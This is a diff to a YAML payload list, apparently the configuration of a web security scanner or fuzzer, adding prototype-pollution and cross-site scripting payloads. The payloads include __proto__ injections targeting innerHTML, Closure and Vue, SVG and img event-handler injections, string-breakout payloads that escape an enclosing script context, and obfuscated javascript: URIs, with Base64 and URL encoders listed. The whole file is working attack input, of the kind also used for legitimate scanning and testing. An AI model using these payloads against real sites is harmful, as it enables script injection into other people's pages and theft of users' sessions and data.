@@ -1,3 +1,4 @@
+---
 payload:
   - "<body onload=alert('test1')>"
   - "<b onmouseover=alert('Wufff!')>click me!</b>"
@@ -6,6 +7,16 @@ payload:
   - '><script>evil(111)</script>'
   - '<img/src=x/onerror=xxx'
   - '"onwheel=ead(111)'
+  - '?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>'
+  - '?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//'
+  - "__proto__[v-if]=_c.constructor('alert(1)')()"
+  - 'sometext<svg onload=alert(document.domain)>?mimeType=text/html'
+  - "'><svg/onload=alert`xss`>"
+  - '"])}catch(e){if(!this.x)alert(document.domain),this.x=1}//'
+  - '"));if(!self.x)self.x=!alert(document.domain)}catch(e){}//'
+  - '<img src=x onerror=alert(document.domain)>/all'
+  - '<ahref="javascript:top[8680439..toString(30)]()">XSS Test</a>'
+  - '<ahref="javascript:window[/alert/.source]()">XSS Test</a>'
 encoder:
   - Base64Flat
   - URL
